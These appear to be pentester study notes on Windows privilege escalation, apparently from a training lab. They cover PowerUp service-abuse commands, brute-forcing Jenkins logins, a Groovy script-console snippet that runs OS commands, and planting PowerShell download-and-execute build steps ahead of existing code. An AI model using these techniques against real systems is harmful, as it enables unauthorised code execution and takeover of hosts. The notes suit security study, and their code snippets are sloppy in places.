# Privilege Escalation
> Mainly focus on the Domain Privilege Escalation
Table of Content
1. [test](#test)


## Local privilege
> See [Window Privilege Escalation](#test)

All check
```powershell
. .\PowerUp.ps1
Invoke-AllChecks
```

Service abuse
```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx'
```


# Jenkin --> move to CVE catagory
1. jenkin default allow us to read user and computer
2. jenkin dosn't have rate limit which we can burte force if we know the username (form author perspective try guessing password as username or reversed username)
3. with administrator privileges we can run groovy script on the system

>If you have Admin access (default installation before 2.x), go to http://<IP>/script
In the script console, Groovy scripts could be
```Groovy
executed.def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```
5. with normal user, we may can create configuration for the project and we can run OS command via the configuration. (checking permission on burp intruder appending the /configure to the project file) - you need to check every project

>If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter: **powershell –c**

>Again, you could download and execute scripts, run encoded scripts and more.

>In the real world, make our configuration code run before the already-have-code.